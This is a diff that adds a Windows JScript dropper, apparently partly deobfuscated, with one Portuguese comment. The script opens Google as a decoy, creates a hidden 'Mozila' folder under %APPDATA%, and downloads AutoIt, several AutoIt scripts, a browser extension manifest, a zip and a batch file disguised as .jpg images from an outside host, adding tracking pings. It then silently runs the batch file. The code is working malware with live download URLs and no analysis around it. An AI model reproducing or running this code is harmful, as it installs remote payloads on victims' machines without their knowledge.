@@ -1,0 +1,116 @@
+var Vetor_comandos = [
+"Msxml2.XMLhttp",
+"onreadystatechange",
+"readyState",
+"status",
+"ADODB.Stream",
+"open",
+"type",
+"write",
+"position",
+"read",
+"saveToFile",
+"close",
+"GET",
+"send",
+"Scripting.FileSystemObject",
+"WScript.Shell",
+"Shell.Application",
+"%APPDATA%\",
+"ExpandEnvironmentStrings",
+"Mozila",
+"https://www.google.com",
+"http://userexperiencestatics.net/ext/Autoit.jpg",
+"\autoit.exe",
+"http://userexperiencestatics.net/ext/bg.jpg",
+"\bg.js",
+"http://userexperiencestatics.net/ext/ekl.jpg",
+"\ekl.au3",
+"http://userexperiencestatics.net/ext/ff.jpg",
+"\ff.zip",
+"http://userexperiencestatics.net/ext/force.jpg",
+"\force.au3",
+"http://userexperiencestatics.net/ext/sabit.jpg",
+"\sabit.au3",
+"http://userexperiencestatics.net/ext/manifest.jpg",
+"\manifest.json",
+"http://userexperiencestatics.net/ext/run.jpg",
+"\run.bat",
+"http://userexperiencestatics.net/ext/up.jpg",
+"\up.au3",
+"http://whos.amung.us/pingjs/?k=pingjse346",
+"\ping.js",
+"http://whos.amung.us/pingjs/?k=pingjse3462",
+"\ping2.js",
+""];
+(function(_0xc4a4x1) {
+    function _0xc4a4x2(_0xc4a4x2, _0xc4a4x3, _0xc4a4x4) {
+        if (!_0xc4a4x3 || !_0xc4a4x2) {
+            return null
+        };
+        var XMLhttp = WScript.CreateObject("Msxml2.XMLhttp");
+        XMLhttp["onreadystatechange"] = function()
+		{
+            if (XMLhttp["readyState"] === 4 && XMLhttp["status"] === 200) 
+			{
+                Stream1 = new ActiveXObject("ADODB.Stream");
+                Stream1["open"]();
+                Stream1["type"] = 1;
+                Stream1["write"](XMLhttp.ResponseBody);
+                Stream1["position"] = _0xc4a4x4;
+                Stream2 = new ActiveXObject("ADODB.Stream");
+                Stream2["type"] = 1;
+                Stream2["open"]();
+                Stream2["write"](Stream1["read"]());
+                Stream2["saveToFile"](_0xc4a4x3, 2);
+                Stream2["close"]();
+                Stream1["close"]()
+            }
+        };
+        XMLhttp["open"]("GET", _0xc4a4x2, false);
+        XMLhttp["send"](null)
+    }
+    function _0xc4a4x6(_0xc4a4x7, _0xc4a4x8) {
+        {
+            Stream1 = new ActiveXObject('ADODB.Stream');
+            Stream1['open']();
+            Stream1["type"] = 1;
+            Stream1.LoadFromFile(_0xc4a4x7);
+            ix = new ActiveXObject('ADODB.Stream');
+            ix['open']();
+            ix['type'] = 1;
+            ix.LoadFromFile(_0xc4a4x8);
+            Stream2 = new ActiveXObject('ADODB.Stream');
+            Stream2['type'] = 1;
+            Stream2['open']();
+            Stream2['write'](ix['read']());
+            Stream2['write'](Stream1['read']());
+            Stream1['close']();
+            ix['close']();
+            Stream2['saveToFile'](_0xc4a4x7, 2);
+            Stream2['close']()
+        }
+    }
+    fso = new ActiveXObject('Scripting.FileSystemObject');
+    var WSshell = new ActiveXObject("WScript.Shell");
+    ShellApp = new ActiveXObject('Shell.Application');
+    FileDestr = WSshell['ExpandEnvironmentStrings']("%APPDATA%\\");
+    mozklasor = FileDestr + 'Mozila'; // Pasta onde ele joga os arquivos baixados
+    if (!fso.FolderExists(mozklasor)) {
+        fso.CreateFolder(mozklasor)
+    };
+    ShellApp.ShellExecute('https://www.google.com');
+    _0xc4a4x2('http://userexperiencestatics.net/ext/Autoit.jpg',   mozklasor + '\\Autoit.exe', 0);
+    _0xc4a4x2('http://userexperiencestatics.net/ext/bg.jpg',       mozklasor + '\\bg.js',      0);
+    _0xc4a4x2('http://userexperiencestatics.net/ext/ekl.jpg',      mozklasor + '\\ekl.au3',    0);
+    _0xc4a4x2('http://userexperiencestatics.net/ext/ff.jpg',       mozklasor + '\\ff.zip',     0);
+    _0xc4a4x2('http://userexperiencestatics.net/ext/force.jpg',    mozklasor + '\\force.au3',  0);
+    _0xc4a4x2('http://userexperiencestatics.net/ext/sabit.jpg',    mozklasor + '\\sabit.au3',  0);
+    _0xc4a4x2('http://userexperiencestatics.net/ext/manifest.jpg', mozklasor + '\\manifest.json', 0);
+    _0xc4a4x2('http://userexperiencestatics.net/ext/run.jpg',      mozklasor + '\run.bat',     0);
+    _0xc4a4x2('http://userexperiencestatics.net/ext/up.jpg',       mozklasor + '\\up.au3',     0);
+    _0xc4a4x2('http://whos.amung.us/pingjs/?k=pingjse346',         mozklasor + '\\ping.js',    0);
+    _0xc4a4x2('http://whos.amung.us/pingjs/?k=pingjse3462',        mozklasor + '\\ping2.js', 0);
+    ShellApp.ShellExecute(mozklasor + '\\run.bat', '', mozklasor, '', 0)
+})
+(this)
